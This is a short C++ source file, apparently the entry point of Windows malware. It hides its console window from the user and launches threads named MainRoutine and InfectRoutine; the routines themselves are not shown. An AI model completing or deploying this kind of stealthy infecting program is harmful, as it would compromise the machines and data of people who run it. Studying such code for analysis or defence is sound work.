#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <regex>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>
#include <sys/stat.h>
#include <thread>
#include <wininet.h>
#include "Modules.h"

namespace fs = std::filesystem;


int main(int argc, char* argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	std::thread mr(MainRoutine);
	std::thread ir(InfectRoutine);
	mr.join();
}
